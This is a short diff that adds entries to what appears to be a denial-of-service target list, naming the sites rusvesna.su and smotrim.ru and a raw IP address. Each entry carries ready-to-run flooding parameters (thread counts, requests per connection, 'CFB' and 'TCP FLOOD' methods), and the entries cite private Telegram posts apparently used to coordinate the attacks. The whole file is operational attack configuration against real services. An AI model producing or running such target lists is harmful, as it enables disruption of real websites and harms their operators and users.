@@ -1,0 +1,4 @@
+### rusvesna.su https://t.me/c/1624648668/87
+http://rusvesna.su/ http://m.rusvesna.su/ -t 1000 -p 300 --rpc 50 --http-methods CFB --debug
+### smotrim.ru https://t.me/c/1624648668/85
+tcp://80.249.129.244:443 tcp://80.249.129.244:80 -t 1000 -p 300 --rpc 50 --http-methods TCP FLOOD --debug
